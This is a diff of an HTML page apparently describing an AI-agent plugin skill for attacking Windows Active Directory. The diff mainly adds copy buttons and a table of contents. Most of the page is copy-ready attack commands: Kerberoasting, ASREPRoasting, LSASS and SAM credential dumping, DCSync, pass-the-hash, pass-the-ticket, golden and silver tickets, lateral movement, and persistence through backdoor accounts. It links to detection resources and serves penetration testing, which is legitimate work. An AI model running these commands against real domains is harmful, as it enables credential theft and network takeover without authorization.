@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Attack and enumerate Active Directory environments using Kerberos attacks (Kerberoasting, ASREPRoasting), credential dumping (DCSync, Mimikatz), lateral movement (PtH, PtT), and BloodHound analysis. Use when pentesting Windows domains or exploiting AD misconfigurations.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><h2>When to Use</h2>
+<div class="wrap slayout"><article><h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>AD reconnaissance and enumeration</li>
 <li>Kerberos-based attacks</li>
@@ -48,7 +60,7 @@
 <li>BloodHound attack path analysis</li>
 <li>Domain persistence techniques</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Non-Windows / Linux-only environments</strong> — use <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
 <li><strong>Cracking the hashes you collected</strong> — use <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
@@ -57,13 +69,13 @@
 <li><strong>Detecting these attacks defensively</strong> — use <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a></li>
 </ul>
 <p>A privileged, Kerberoastable account with no logon history is a classic honeyuser: roasting it raises a high-fidelity alert. Check <a class="xref" href="recognizing-deception.html"><code>recognizing-deception</code></a> before roasting an account that looks too convenient.</p>
-<h2>Route to a Depth Skill</h2>
+<h2 id="route-to-a-depth-skill">Route to a Depth Skill</h2>
 <p>Several AD escalation families are deep enough to have their own procedure skill. When enumeration points at one of these, switch to it — the general methodology here does not carry the tool-specific detail they do.</p>
 <div class="tw"><table><thead><tr><th>Signal</th><th>Skill</th></tr></thead><tbody><tr><td>A CA exists (<code>pKIEnrollmentService</code>), <code>certipy find</code> flags a template, ESC1-ESC16</td><td><a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a></td></tr><tr><td>BloodHound flags Unconstrained/Constrained/RBCD delegation, <code>GenericWrite</code> over a computer</td><td><a class="xref" href="attacking-kerberos-delegation.html"><code>attacking-kerberos-delegation</code></a></td></tr><tr><td>The target is Entra ID / Azure AD, tokens, PRTs, or hybrid-identity sync</td><td><a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></td></tr></tbody></table></div>
 <p>The domain methodology below (Kerberoasting, DCSync, lateral movement) still applies; these skills specialize a single step of it and hand back here.</p>
-<h2>Kerberoasting</h2>
+<h2 id="kerberoasting">Kerberoasting</h2>
 <p><strong>Windows:</strong></p>
-<pre><code># Check kerberoastable users
+<div class="codeblk cx"><button class="copy" data-copy="# Check kerberoastable users
 .\Rubeus.exe kerberoast /stats
 
 # Roast all
@@ -73,48 +85,94 @@
 .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt
 
 # Target admins only
-.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap</code></pre>
+.\Rubeus.exe kerberoast /ldapfilter:&#x27;(admincount=1)&#x27; /nowrap">copy</button><pre><code># Check kerberoastable users
+.\Rubeus.exe kerberoast /stats
+
+# Roast all
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Target specific user
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt
+
+# Target admins only
+.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap</code></pre></div>
 <p><strong>Linux:</strong></p>
-<pre><code># Impacket GetUserSPNs
+<div class="codeblk cx"><button class="copy" data-copy="# Impacket GetUserSPNs
 GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.txt
 
 # With NT hash
 GetUserSPNs.py -request -dc-ip 10.10.10.10 -hashes :ntlmhash domain.local/user -outputfile hashes.txt
 
 # Target specific user
-GetUserSPNs.py -request-user svc_mssql -dc-ip 10.10.10.10 domain.local/user:password</code></pre>
+GetUserSPNs.py -request-user svc_mssql -dc-ip 10.10.10.10 domain.local/user:password">copy</button><pre><code># Impacket GetUserSPNs
+GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.txt
+
+# With NT hash
+GetUserSPNs.py -request -dc-ip 10.10.10.10 -hashes :ntlmhash domain.local/user -outputfile hashes.txt
+
+# Target specific user
+GetUserSPNs.py -request-user svc_mssql -dc-ip 10.10.10.10 domain.local/user:password</code></pre></div>
 <p><strong>Crack Hashes:</strong></p>
-<pre><code># Hashcat (TGS-REP)
+<div class="codeblk cx"><button class="copy" data-copy="# Hashcat (TGS-REP)
 hashcat -m 13100 hashes.txt wordlist.txt
 
 # John
-john --wordlist=wordlist.txt hashes.txt</code></pre>
-<h2>ASREPRoasting</h2>
+john --wordlist=wordlist.txt hashes.txt">copy</button><pre><code># Hashcat (TGS-REP)
+hashcat -m 13100 hashes.txt wordlist.txt
+
+# John
+john --wordlist=wordlist.txt hashes.txt</code></pre></div>
+<h2 id="asreproasting">ASREPRoasting</h2>
 <p><strong>Windows:</strong></p>
-<pre><code># Enumerate vulnerable users
+<div class="codeblk cx"><button class="copy" data-copy="# Enumerate vulnerable users
 Get-DomainUser -PreauthNotRequired
 
 # Roast
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
-.\Rubeus.exe asreproast /user:victim /format:hashcat</code></pre>
+.\Rubeus.exe asreproast /user:victim /format:hashcat">copy</button><pre><code># Enumerate vulnerable users
+Get-DomainUser -PreauthNotRequired
+
+# Roast
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+.\Rubeus.exe asreproast /user:victim /format:hashcat</code></pre></div>
 <p><strong>Linux:</strong></p>
-<pre><code># With domain creds
+<div class="codeblk cx"><button class="copy" data-copy="# With domain creds
 GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile hashes.txt
 
 # Without creds (username list)
-GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10</code></pre>
+GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10">copy</button><pre><code># With domain creds
+GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile hashes.txt
+
+# Without creds (username list)
+GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10</code></pre></div>
 <p><strong>Crack AS-REP:</strong></p>
-<pre><code>hashcat -m 18200 hashes.txt wordlist.txt</code></pre>
-<h2>BloodHound</h2>
+<div class="codeblk cx"><button class="copy" data-copy="hashcat -m 18200 hashes.txt wordlist.txt">copy</button><pre><code>hashcat -m 18200 hashes.txt wordlist.txt</code></pre></div>
+<h2 id="bloodhound">BloodHound</h2>
 <p><strong>Data Collection:</strong></p>
-<pre><code># Windows - SharpHound
+<div class="codeblk cx"><button class="copy" data-copy="# Windows - SharpHound
 .\SharpHound.exe -c All --zipfilename output.zip
-.\SharpHound.exe -c All,GPOLocalGroup</code></pre>
+.\SharpHound.exe -c All,GPOLocalGroup">copy</button><pre><code># Windows - SharpHound
+.\SharpHound.exe -c All --zipfilename output.zip
+.\SharpHound.exe -c All,GPOLocalGroup</code></pre></div>
 <p><strong>Linux:</strong></p>
-<pre><code># bloodhound-python
-bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.local -c All --zip</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="# bloodhound-python
+bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.local -c All --zip">copy</button><pre><code># bloodhound-python
+bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.local -c All --zip</code></pre></div>
 <p><strong>Useful Queries:</strong></p>
-<pre><code># Shortest path to Domain Admins
+<div class="codeblk cx"><button class="copy" data-copy="# Shortest path to Domain Admins
+MATCH p=shortestPath((n)-[*1..]-&gt;(m:Group {name:&#x27;DOMAIN ADMINS@DOMAIN.LOCAL&#x27;})) RETURN p
+
+# Kerberoastable users
+MATCH (u:User {hasspn:true}) RETURN u
+
+# AS-REP Roastable
+MATCH (u:User {dontreqpreauth:true}) RETURN u
+
+# Unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+
+# DCSync rights
+MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]-&gt;(d:Domain) RETURN p">copy</button><pre><code># Shortest path to Domain Admins
 MATCH p=shortestPath((n)-[*1..]-&gt;(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
 
 # Kerberoastable users
@@ -127,10 +185,10 @@ MATCH (u:User {dontreqpreauth:true}) RETURN u
 MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
 
 # DCSync rights
-MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]-&gt;(d:Domain) RETURN p</code></pre>
-<h2>Credential Dumping</h2>
+MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]-&gt;(d:Domain) RETURN p</code></pre></div>
+<h2 id="credential-dumping">Credential Dumping</h2>
 <p><strong>LSASS Dumping:</strong></p>
-<pre><code># Task Manager: Right-click lsass.exe -&gt; Create dump file
+<div class="codeblk cx"><button class="copy" data-copy="# Task Manager: Right-click lsass.exe -&gt; Create dump file
 
 # procdump
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -140,29 +198,52 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\Temp
 
 # Parse offline with mimikatz
 sekurlsa::minidump lsass.dmp
-sekurlsa::logonpasswords</code></pre>
+sekurlsa::logonpasswords">copy</button><pre><code># Task Manager: Right-click lsass.exe -&gt; Create dump file
+
+# procdump
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# comsvcs.dll
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\Temp\lsass.dmp full
+
+# Parse offline with mimikatz
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords</code></pre></div>
 <p><strong>SAM Dumping:</strong></p>
-<pre><code># Save hives
+<div class="codeblk cx"><button class="copy" data-copy="# Save hives
 reg save HKLM\SAM sam.hive
 reg save HKLM\SYSTEM system.hive
 
 # Extract hashes (Linux)
-secretsdump.py -sam sam.hive -system system.hive LOCAL</code></pre>
+secretsdump.py -sam sam.hive -system system.hive LOCAL">copy</button><pre><code># Save hives
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+
+# Extract hashes (Linux)
+secretsdump.py -sam sam.hive -system system.hive LOCAL</code></pre></div>
 <p><strong>DCSync (Domain):</strong></p>
-<pre><code># secretsdump - dump all
+<div class="codeblk cx"><button class="copy" data-copy="# secretsdump - dump all
 secretsdump.py domain.local/user:password@dc.domain.local -just-dc
 
 # Specific user
 secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt
 
 # With NTLM hash
-secretsdump.py -hashes :ntlmhash domain.local/user@dc.domain.local -just-dc</code></pre>
-<h2>Pass-the-Hash</h2>
+secretsdump.py -hashes :ntlmhash domain.local/user@dc.domain.local -just-dc">copy</button><pre><code># secretsdump - dump all
+secretsdump.py domain.local/user:password@dc.domain.local -just-dc
+
+# Specific user
+secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt
+
+# With NTLM hash
+secretsdump.py -hashes :ntlmhash domain.local/user@dc.domain.local -just-dc</code></pre></div>
+<h2 id="pass-the-hash">Pass-the-Hash</h2>
 <p><strong>Windows:</strong></p>
-<pre><code># Mimikatz
-sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="# Mimikatz
+sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe">copy</button><pre><code># Mimikatz
+sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe</code></pre></div>
 <p><strong>Linux:</strong></p>
-<pre><code># NetExec (nxc)
+<div class="codeblk cx"><button class="copy" data-copy="# NetExec (nxc)
 nxc smb 10.10.10.10 -u administrator -H hash
 nxc smb 10.10.10.10 -u administrator -H hash -x whoami
 
@@ -173,56 +254,99 @@ psexec.py -hashes :hash administrator@10.10.10.10
 wmiexec.py -hashes :hash administrator@10.10.10.10
 
 # evil-winrm
-evil-winrm -i 10.10.10.10 -u administrator -H hash</code></pre>
-<h2>Pass-the-Ticket</h2>
+evil-winrm -i 10.10.10.10 -u administrator -H hash">copy</button><pre><code># NetExec (nxc)
+nxc smb 10.10.10.10 -u administrator -H hash
+nxc smb 10.10.10.10 -u administrator -H hash -x whoami
+
+# psexec
+psexec.py -hashes :hash administrator@10.10.10.10
+
+# wmiexec
+wmiexec.py -hashes :hash administrator@10.10.10.10
+
+# evil-winrm
+evil-winrm -i 10.10.10.10 -u administrator -H hash</code></pre></div>
+<h2 id="pass-the-ticket">Pass-the-Ticket</h2>
 <p><strong>Export Tickets:</strong></p>
-<pre><code># Mimikatz
+<div class="codeblk cx"><button class="copy" data-copy="# Mimikatz
 sekurlsa::tickets /export
 
 # Rubeus
 .\Rubeus.exe dump /nowrap
-.\Rubeus.exe monitor /interval:10</code></pre>
+.\Rubeus.exe monitor /interval:10">copy</button><pre><code># Mimikatz
+sekurlsa::tickets /export
+
+# Rubeus
+.\Rubeus.exe dump /nowrap
+.\Rubeus.exe monitor /interval:10</code></pre></div>
 <p><strong>Import/Use Tickets:</strong></p>
-<pre><code># Mimikatz
+<div class="codeblk cx"><button class="copy" data-copy="# Mimikatz
 kerberos::ptt ticket.kirbi
 
 # Rubeus
 .\Rubeus.exe ptt /ticket:base64ticket
 
 # Verify
-klist</code></pre>
+klist">copy</button><pre><code># Mimikatz
+kerberos::ptt ticket.kirbi
+
+# Rubeus
+.\Rubeus.exe ptt /ticket:base64ticket
+
+# Verify
+klist</code></pre></div>
 <p><strong>Linux PtT:</strong></p>
-<pre><code># Convert kirbi to ccache
+<div class="codeblk cx"><button class="copy" data-copy="# Convert kirbi to ccache
 ticketConverter.py ticket.kirbi ticket.ccache
 
 # Set ticket
 export KRB5CCNAME=ticket.ccache
 
 # Use ticket
-psexec.py -k -no-pass domain.local/administrator@dc.domain.local</code></pre>
-<h2>Overpass-the-Hash</h2>
-<pre><code># Rubeus - request TGT with NTLM hash
+psexec.py -k -no-pass domain.local/administrator@dc.domain.local">copy</button><pre><code># Convert kirbi to ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# Set ticket
+export KRB5CCNAME=ticket.ccache
+
+# Use ticket
+psexec.py -k -no-pass domain.local/administrator@dc.domain.local</code></pre></div>
+<h2 id="overpass-the-hash">Overpass-the-Hash</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Rubeus - request TGT with NTLM hash
 .\Rubeus.exe asktgt /user:administrator /domain:domain.local /rc4:hash /ptt
 
 # With AES key (better OPSEC)
-.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt</code></pre>
-<h2>Golden/Silver Tickets</h2>
+.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt">copy</button><pre><code># Rubeus - request TGT with NTLM hash
+.\Rubeus.exe asktgt /user:administrator /domain:domain.local /rc4:hash /ptt
+
+# With AES key (better OPSEC)
+.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt</code></pre></div>
+<h2 id="golden-silver-tickets">Golden/Silver Tickets</h2>
 <p><strong>Golden Ticket (TGT):</strong></p>
-<pre><code># Requirements: krbtgt hash, Domain SID
+<div class="codeblk cx"><button class="copy" data-copy="# Requirements: krbtgt hash, Domain SID
 
 # Mimikatz
 kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
 
 # Rubeus
-.\Rubeus.exe golden /rc4:hash /user:administrator /domain:domain.local /sid:S-1-5-21-... /ptt</code></pre>
+.\Rubeus.exe golden /rc4:hash /user:administrator /domain:domain.local /sid:S-1-5-21-... /ptt">copy</button><pre><code># Requirements: krbtgt hash, Domain SID
+
+# Mimikatz
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
+
+# Rubeus
+.\Rubeus.exe golden /rc4:hash /user:administrator /domain:domain.local /sid:S-1-5-21-... /ptt</code></pre></div>
 <p><strong>Silver Ticket (TGS):</strong></p>
-<pre><code># Requirements: Service account hash, Service SPN
+<div class="codeblk cx"><button class="copy" data-copy="# Requirements: Service account hash, Service SPN
 
 # Mimikatz - CIFS service
-kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt</code></pre>
-<h2>Lateral Movement</h2>
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt">copy</button><pre><code># Requirements: Service account hash, Service SPN
+
+# Mimikatz - CIFS service
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt</code></pre></div>
+<h2 id="lateral-movement">Lateral Movement</h2>
 <p><strong>NetExec (nxc):</strong></p>
-<pre><code># SMB spray
+<div class="codeblk cx"><button class="copy" data-copy="# SMB spray
 nxc smb 10.10.10.0/24 -u user -p password
 
 # Execute commands
@@ -233,39 +357,71 @@ nxc smb 10.10.10.10 -u admin -H hash -x whoami
 nxc smb 10.10.10.10 -u admin -p password --sam
 
 # Dump LSA
-nxc smb 10.10.10.10 -u admin -p password --lsa</code></pre>
+nxc smb 10.10.10.10 -u admin -p password --lsa">copy</button><pre><code># SMB spray
+nxc smb 10.10.10.0/24 -u user -p password
+
+# Execute commands
+nxc smb 10.10.10.10 -u admin -p password -x whoami
+nxc smb 10.10.10.10 -u admin -H hash -x whoami
+
+# Dump SAM
+nxc smb 10.10.10.10 -u admin -p password --sam
+
+# Dump LSA
+nxc smb 10.10.10.10 -u admin -p password --lsa</code></pre></div>
 <p><strong>PSExec Variants:</strong></p>
-<pre><code># psexec
+<div class="codeblk cx"><button class="copy" data-copy="# psexec
 psexec.py domain/user:password@10.10.10.10
 
 # wmiexec (stealthier)
 wmiexec.py domain/user:password@10.10.10.10
 
 # smbexec (no service)
-smbexec.py domain/user:password@10.10.10.10</code></pre>
+smbexec.py domain/user:password@10.10.10.10">copy</button><pre><code># psexec
+psexec.py domain/user:password@10.10.10.10
+
+# wmiexec (stealthier)
+wmiexec.py domain/user:password@10.10.10.10
+
+# smbexec (no service)
+smbexec.py domain/user:password@10.10.10.10</code></pre></div>
 <p><strong>WinRM:</strong></p>
-<pre><code># PowerShell
-Enter-PSSession -ComputerName dc.domain.local -Credential domain\user</code></pre>
-<pre><code># evil-winrm
+<div class="codeblk cx"><button class="copy" data-copy="# PowerShell
+Enter-PSSession -ComputerName dc.domain.local -Credential domain\user">copy</button><pre><code># PowerShell
+Enter-PSSession -ComputerName dc.domain.local -Credential domain\user</code></pre></div>
+<div class="codeblk cx"><button class="copy" data-copy="# evil-winrm
 evil-winrm -i 10.10.10.10 -u administrator -p password
-evil-winrm -i 10.10.10.10 -u administrator -H hash</code></pre>
-<h2>Enumeration</h2>
+evil-winrm -i 10.10.10.10 -u administrator -H hash">copy</button><pre><code># evil-winrm
+evil-winrm -i 10.10.10.10 -u administrator -p password
+evil-winrm -i 10.10.10.10 -u administrator -H hash</code></pre></div>
+<h2 id="enumeration">Enumeration</h2>
 <p><strong>Domain Info:</strong></p>
-<pre><code># PowerView
+<div class="codeblk cx"><button class="copy" data-copy="# PowerView
 Get-Domain
 Get-DomainController
 Get-DomainUser
 Get-DomainComputer
 Get-DomainGroup
-Get-DomainGroupMember "Domain Admins"</code></pre>
+Get-DomainGroupMember &quot;Domain Admins&quot;">copy</button><pre><code># PowerView
+Get-Domain
+Get-DomainController
+Get-DomainUser
+Get-DomainComputer
+Get-DomainGroup
+Get-DomainGroupMember "Domain Admins"</code></pre></div>
 <p><strong>Linux Enumeration:</strong></p>
-<pre><code># NetExec (nxc, formerly CrackMapExec)
+<div class="codeblk cx"><button class="copy" data-copy="# NetExec (nxc, formerly CrackMapExec)
 nxc smb 10.10.10.0/24 -u user -p password --users
 nxc smb 10.10.10.0/24 -u user -p password --groups
 
 # ldapsearch
-ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"</code></pre>
-<h2>Quick Workflow</h2>
+ldapsearch -x -H ldap://10.10.10.10 -D &#x27;user@domain.local&#x27; -w &#x27;password&#x27; -b &quot;DC=domain,DC=local&quot;">copy</button><pre><code># NetExec (nxc, formerly CrackMapExec)
+nxc smb 10.10.10.0/24 -u user -p password --users
+nxc smb 10.10.10.0/24 -u user -p password --groups
+
+# ldapsearch
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"</code></pre></div>
+<h2 id="quick-workflow">Quick Workflow</h2>
 <ol>
 <li><strong>Initial Access</strong> → Get domain credentials</li>
 <li><strong>Enumeration</strong> → Run BloodHound collection</li>
@@ -275,7 +431,7 @@ ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=
 <li><strong>DCSync</strong> → Extract all domain hashes from DC</li>
 <li><strong>Persistence</strong> → Golden ticket or create backdoor accounts</li>
 </ol>
-<h2>Common Wins</h2>
+<h2 id="common-wins">Common Wins</h2>
 <ul>
 <li>Kerberoasting weak service account passwords</li>
 <li>ASREPRoasting accounts without preauth</li>
@@ -283,7 +439,7 @@ ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=
 <li>Pass-the-Hash from dumped credentials</li>
 <li>DCSync with compromised accounts that have replication rights</li>
 </ul>
-<h2>Tools</h2>
+<h2 id="tools">Tools</h2>
 <ul>
 <li><strong>Rubeus</strong> - Kerberos attacks (Windows)</li>
 <li><strong>Mimikatz</strong> - Credential dumping (Windows)</li>
@@ -293,7 +449,7 @@ ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=
 <li><strong>PowerView</strong> - AD enumeration (PowerShell)</li>
 <li><strong>evil-winrm</strong> - WinRM access (Linux)</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Initial Access</strong> (TA0001)</p>
 <ul>
@@ -344,11 +500,14 @@ ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=
 <li><a href="https://attack.mitre.org/techniques/T1550/003/">T1550.003</a> Pass the Ticket</li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</li>
 <li>https://github.com/fortra/impacket</li>
 <li>https://github.com/GhostPack/Rubeus</li>
 <li>https://github.com/BloodHoundAD/BloodHound</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#route-to-a-depth-skill">Route to a Depth Skill</a><a href="#kerberoasting">Kerberoasting</a><a href="#asreproasting">ASREPRoasting</a><a href="#bloodhound">BloodHound</a><a href="#credential-dumping">Credential Dumping</a><a href="#pass-the-hash">Pass-the-Hash</a><a href="#pass-the-ticket">Pass-the-Ticket</a><a href="#overpass-the-hash">Overpass-the-Hash</a><a href="#golden-silver-tickets">Golden/Silver Tickets</a><a href="#lateral-movement">Lateral Movement</a><a href="#enumeration">Enumeration</a><a href="#quick-workflow">Quick Workflow</a><a href="#common-wins">Common Wins</a><a href="#tools">Tools</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
